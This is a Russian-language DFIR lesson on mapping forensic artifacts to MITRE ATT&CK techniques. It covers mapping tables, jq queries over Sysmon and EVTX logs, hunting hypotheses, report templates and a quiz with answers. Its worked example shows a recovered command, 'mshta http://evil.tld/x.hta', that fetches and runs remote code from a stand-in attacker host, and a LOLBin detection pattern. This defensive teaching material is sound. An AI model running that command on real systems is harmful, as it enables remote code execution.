---
id: forensics-attack-mapping
title: "Маппинг артефактов на MITRE ATT&CK"
category: forensics
parent: forensics-reporting
difficulty: medium
order: 2
tags: [mitre, attack, mapping, dfir, reporting, threat-hunting]
prerequisites: [forensics-reporting, forensics-windows-artifacts]
useful_for:
  - "CTF Forensics категория"
  - "DFIR / Incident Response"
  - "Threat Hunting / SOC"
estimated_minutes: 45
summary: "Как сопоставлять форензические артефакты с техниками MITRE ATT&CK: таблица артефакт→техника, построение покрытия и использование в отчёте и детектах."
---
Сопоставление артефактов с MITRE ATT&CK превращает разрозненные находки в структурированную картину действий атакующего и помогает строить детекты. Этот урок — про таблицу «артефакт → техника», покрытие и использование в отчёте и threat hunting.

## Что такое ATT&CK

MITRE ATT&CK — база знаний о тактиках (зачем) и техниках (как) атакующих. Тактики: Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact. Техники имеют ID (T1059 — Command and Scripting Interpreter).

## Таблица «артефакт → техника»

| Артефакт | Техника | ID |
|----------|---------|-----|
| Prefetch/Amcache (запуск) | Execution | T1059, T1204 |
| Sysmon 1 (`mshta`, `powershell -enc`) | Command and Scripting | T1059.001 |
| Run/Services/Task | Persistence | T1547, T1053 |
| WMI-подписки | Persistence | T1546.003 |
| LSASS-дамп (Sysmon 10) | Credential Access | T1003.001 |
| Kerberoasting | Credential Access | T1558.003 |
| Pass-the-Hash | Lateral Movement | T1550.002 |
| PsExec/service creation | Lateral Movement | T1021.002, T1569.002 |
| Log clearing (1102) | Defense Evasion | T1070.001 |
| Timestomp | Defense Evasion | T1070.006 |
| DNS-туннель | C2 / Exfil | T1071.004, T1048.003 |
| Scheduled Task с PS | Persistence/Execution | T1053.005 |
| USB-копирование | Exfiltration | T1052.001 |
| Encrypted payload | Defense Evasion | T1027 |

## Построение картины

Соберите артефакты, сопоставьте с техниками, выстройте цепочку по тактикам.

```bash
# пример: Sysmon 1 -> какие LOLBins
$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==1) | .Event.EventData.Image' | sort | uniq -c | sort -rn | head
# сопоставить вручную с ATT&CK (T1059)
```

```bash
# свести артефакты в таблицу техник (ручной/скриптовый маппинг)
$ cat > attack_map.txt <<'EOF'
T1059.001 powershell -enc (Sysmon 1)
T1053.005 Scheduled Task Updater
T1003.001 LSASS access (Sysmon 10)
T1070.001 log cleared (1102)
T1071.004 DNS tunnel (pcap)
EOF
```

## Покрытие и детекты

ATT&CK Navigator — инструмент визуализации покрытия: отметьте, какие техники вы **видите** (какие артефакты собираете) и какие **детектируете** (правила). Пробелы показывают, какие логи/сенсоры добавить.

| Вопрос | Ответ |
|--------|-------|
| Видим ли технику? | есть ли источник (Sysmon, auditd)? |
| Детектируем ли? | есть ли правило (Sigma)? |
| Покрытие | % техник с источником+правилом |

## Использование в отчёте

В отчёте для каждого этапа атаки указывайте: тактику, технику, ID, артефакт-доказательство. Это делает вывод воспроизводимым и понятным.

```
[Execution] T1059.001 — PowerShell -enc: Sysmon 1, 2024-03-01 12:10, cmdline "..."
[Persistence] T1053.005 — Scheduled Task "Updater": TaskScheduler 106
[Credential Access] T1003.001 — LSASS access: Sysmon 10
[Defense Evasion] T1070.001 — Security log cleared: Event 1102
```

## Разобранный пример

Дан набор артефактов. Строим маппинг.

```bash
# 1. Execution
$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==1 and (.Event.EventData.Image|test("mshta"))) | .Event.EventData.CommandLine'
mshta http://evil.tld/x.hta      # T1218.005 (Mshta)
# 2. Persistence
$ evtx_dump -o json 'TaskScheduler%4Operational.evtx' | jq 'select(.Event.System.EventID==106)'
Updater                          # T1053.005
# 3. Credential Access
$ evtx_dump -o json Sysmon.evtx | jq 'select(.Event.System.EventID==10 and (.Event.EventData.TargetImage|test("lsass")))'
                                 # T1003.001
# 4. C2
$ tshark -r c2.pcap -Y 'dns' -T fields -e dns.qry.name | head    # T1071.004
```

## Справочная таблица тактик

| Тактика | Примеры техник |
|---------|----------------|
| Initial Access | T1566 (фишинг), T1190 (эксплойт) |
| Execution | T1059, T1204 |
| Persistence | T1547, T1053, T1546.003 |
| Priv Esc | T1068, T1548 |
| Defense Evasion | T1070, T1027, T1218 |
| Credential Access | T1003, T1558 |
| Discovery | T1082, T1018 |
| Lateral Movement | T1021, T1550 |
| Collection | T1005, T1113 |
| C2 | T1071, T1573 |
| Exfiltration | T1041, T1048, T1052 |
| Impact | T1486 (ransomware) |

## Частые ошибки

- **Маппить без доказательств** — каждая техника должна опираться на артефакт.
- **Путать тактику и технику** — тактика «зачем», техника «как».
- **Игнорировать субтехники** — T1059.001 ≠ T1059.003.
- **Считать одну технику = полная картина** — стройте цепочку.
- **Не обновлять базу** — ATT&CK эволюционирует.
- **Забывать про покрытие** — отчёт должен указывать пробелы.

## Что дальше / решение

Конвейер: собрать артефакты → сопоставить с техниками → выстроить цепочку тактик → визуализировать покрытие (Navigator) → включить в отчёт. Связка: `forensics-reporting` (отчёт), `forensics-windows-artifacts` (артефакты), `forensics-timeline` (хронология), `forensics-evtx-deep` (события).

## Threat hunting на основе ATT&CK

ATT&CK задаёт гипотезы для hunting: «если атакующий использовал T1053.005 (Scheduled Task), то в TaskScheduler EVTX будет событие 106 с подозрительной командой». Строите запрос под каждую технику.

```bash
# гипотеза: LOLBins (T1218)
$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==1 and (.Event.EventData.Image|test("mshta|regsvr32|rundll32|wmic"))) | .Event.EventData.CommandLine'
# гипотеза: LSASS access (T1003.001)
$ evtx_dump -o json Sysmon.evtx | jq 'select(.Event.System.EventID==10 and (.Event.EventData.TargetImage|test("lsass")))'
# гипотеза: log cleared (T1070.001)
$ evtx_dump -o json Security.evtx | jq 'select(.Event.System.EventID==1102)'
```

Hunting по ATT&CK — это систематическая проверка гипотез по каждому источнику, а не разовый поиск сигнатуры.

## Маппинг артефактов в отчёт

Для каждого этапа фиксируйте тактику/технику/ID и артефакт:

```
[Initial Access] T1566.001 — вложение в письме (EML, sha256 ...)
[Execution]      T1204.002 — макрос AutoOpen (olevba)
[Persistence]    T1053.005 — Scheduled Task Updater (EVTX 106)
[Priv Esc]       T1068 — эксплойт (Sysmon 8)
[Defense Evasion]T1070.001 — Security log cleared (EVTX 1102)
[Cred Access]    T1003.001 — LSASS access (Sysmon 10)
[C2]             T1071.004 — DNS tunnel (pcap)
[Exfil]          T1048.003 — вынос по DNS
```

## Сводный чек-лист

1. Собрать все артефакты (диск/память/сеть).
2. Для каждого — определить технику ATT&CK.
3. Выстроить цепочку по тактикам.
4. Отметить покрытие (что видим/детектируем).
5. Указать пробелы (какие логи добавить).
6. Включить таблицу в отчёт.

## Ограничения

- **Маппинг субъективен** — одна активность может соответствовать нескольким техникам.
- **Субтехники** требуют точности.
- **Не все артефакты маппятся** — некоторые события вне ATT&CK.
- **ATT&CK обновляется** — используйте актуальную версию.
- **Не подменяйте доказательства** маппингом: техника без артефакта недоказуема.

## Краткое резюме

Сопоставление артефактов с MITRE ATT&CK превращает находки в структурированную картину и служит основой для детектов и hunting. Для каждого этапа атаки указывайте тактику, технику, её ID и подтверждающий артефакт — это делает отчёт воспроизводимым и понятным. ATT&CK Navigator помогает визуализировать покрытие и находить пробелы (какие источники логов добавить). Помните: маппинг — это интерпретация доказательств, а не их замена; каждая техника должна опираться на конкретный артефакт.

## Квиз

```quiz
- question: "Что такое техника в MITRE ATT&CK?"
  options:
    - "зачем атакует (тактика)"
    - "как именно реализуется (конкретный метод)"
    - "название малвари"
    - "IP-адрес"
  answer: 1
- question: "На какую технику маппится WMI-подписка?"
  options:
    - "T1059"
    - "T1546.003 WMI Event Subscription"
    - "T1003"
    - "T1070"
  answer: 1
- question: "Что означает Event 1102 в контексте ATT&CK?"
  options:
    - "T1547.001"
    - "T1070.001 Clear Windows Event Logs"
    - "T1055"
    - "T1566"
  answer: 1
- question: "На какую тактику маппится доступ к lsass.exe?"
  options:
    - "Recon"
    - "Credential Access (T1003.001)"
    - "Impact"
    - "Initial Access"
  answer: 1
- question: "Зачем маппить артефакты на ATT&CK в отчёте?"
  options:
    - "для красоты"
    - "общий язык, сравнение инцидентов и покрытие детектов"
    - "чтобы скрыть улики"
    - "для шифрования"
  answer: 1
```

## Где пригодится

- **CTF:** структурированное описание атаки.
- **DFIR:** стандартизированный отчёт об инциденте.
- **Threat Hunting:** построение покрытия детектов.
- **SOC:** приоритизация правил по техникам.
- **Консалтинг:** рекомендации контрмер по ATT&CK.
